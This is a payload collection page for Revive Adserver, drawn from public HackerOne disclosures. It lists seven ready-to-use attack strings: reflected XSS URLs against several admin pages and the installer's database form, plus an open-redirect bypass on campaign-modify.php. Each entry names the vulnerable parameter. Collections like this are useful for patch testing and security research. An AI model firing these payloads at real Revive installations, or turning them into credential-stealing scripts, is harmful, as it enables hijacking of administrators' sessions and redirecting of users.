# Revive Adserver

7 payloads.

### `158df9c6`

```
something<script>alert('xss');</script>
```

**Parameter:** `dbName`
— [Reflected XSS in Step 2 of the Installation](https://hackerone.com/reports/170156) · Revive Adserver · [pavanw3b](https://hackerone.com/pavanw3b)

### `77ca7811`

```
_qf__install-db-form=&action=database&moreFieldsShown=&dbName=something<script>alert('xss');</script>&dbUser=root&dbPassword=roots&dbHost=localhost&dbType=mysql&dbLocal=0&dbPort=3306&dbTableType=MYISAM&dbTablePrefix=rv_&save=Continue+%C2%BB
```

**Parameter:** `dbName`
— [Reflected XSS in Step 2 of the Installation](https://hackerone.com/reports/170156) · Revive Adserver · [pavanw3b](https://hackerone.com/pavanw3b)

### `9bed72ef`

```
/www/admin/campaign-modify.php?clientid=&campaignid=&returnurl=%2F%2F%2F%2Ftarget.com
```

**Parameter:** `returnurl`
— [Open redirection bypass in /www/admin/campaign-modify.php](https://hackerone.com/reports/794144) · Revive Adserver · [hoangn14](https://hackerone.com/hoangn14)

### `cb27e596`

```
http://target.com/admin/userlog-index.php?advertiserId=0&publisherId=0&period_preset=all_events%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E&period_start=&period_end=&setPerPage=10
```

**Parameter:** `period_preset`
— [Reflected XSS on /admin/userlog-index.php](https://hackerone.com/reports/1083231) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)

### `09019d24`

```
http://target.com/admin/stats.php?statsBreakdown=day&listorder=key&orderdirection=up&day=&setPerPage=15%27%20onclick=alert(document.domain)%20accesskey=X%20&entity=global&breakdown=history&period_preset=last_month&period_start=01+December+2020&period_end=31+December+2020
```

**Parameter:** `setPerPage`
— [Reflected XSS on /admin/stats.php](https://hackerone.com/reports/1083376) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)

### `31d2991e`

```
http://target.com/admin/campaign-zone-zones.php?_=&clientid=1&campaignid=1&status=available%22%3E%3Cimg%20src=1%20onerror=alert(document.domain)%3E&text=
```

**Parameter:** `status`
— [Reflected XSS on /admin/campaign-zone-zones.php](https://hackerone.com/reports/1097979) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)

### `566952d4`

```
http://target.com/admin/stats.php?entity=global&breakdown=affiliates&statsBreakdown=day%27%20onclick=alert(document.domain)%20accesskey=X%20
```

**Parameter:** `statsBreakdown`
— [Reflected XSS on /admin/stats.php](https://hackerone.com/reports/1187820) · Revive Adserver · [solov9ev](https://hackerone.com/solov9ev)
